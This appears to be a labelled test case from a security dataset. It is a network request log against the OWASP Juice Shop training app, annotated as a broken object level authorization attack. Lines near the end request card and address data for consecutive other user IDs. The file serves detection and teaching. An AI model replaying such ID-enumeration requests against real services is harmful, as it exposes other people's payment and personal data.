@@ -1,0 +1,24 @@
+id: TR150.networkrequests.juice-shop.broken-object-level-authorization
+label: risky
+type: networkrequests
+references:
+  - payload/author: Kahlhofer, Mario
+  - payload/license: CC-BY-4.0
+  - payload/url: https://juice-shop.herokuapp.com/
+  - metaref: owasp-api1-2019-broken-object-level-authorization
+annotations:
+  - risk/type: attack
+  - risk/risky-lines: "L7:55-59,L8:55-59,L9:55-59,L10:55-59"
+  - risk/present-attack: networkrequests-broken-object-level-authorization
+  - risk/description: "It seems possible to request the card and address information of other users."
+data: |-
+  0.000 GET https://juice-shop.herokuapp.com/rest/basket/12 200 OK (0.2 kB)
+  0.070 POST https://juice-shop.herokuapp.com/api/BasketItems/ 200 OK (0.2 kB)
+  0.213 GET https://juice-shop.herokuapp.com/api/Products/1?d=Mon%20Jan%2002%202023 200 OK (0.3 kB)
+  0.328 GET https://juice-shop.herokuapp.com/rest/basket/14 200 OK (0.5 kB)
+  2.804 GET https://juice-shop.herokuapp.com/rest/basket/14 200 OK (0.5 kB)
+  3.209 GET https://juice-shop.herokuapp.com/assets/public/images/products/apple_juice.jpg 200 OK (15.3 kB)
+  22.903 GET https://juice-shop.herokuapp.com/rest/user/18569/Cards 200 OK (30 bytes)
+  23.906 GET https://juice-shop.herokuapp.com/rest/user/18570/Cards 200 OK (30 bytes)
+  35.496 GET https://juice-shop.herokuapp.com/rest/user/18569/Addresss 200 OK (30 bytes)
+  35.784 GET https://juice-shop.herokuapp.com/rest/user/18570/Addresss 200 OK (30 bytes)
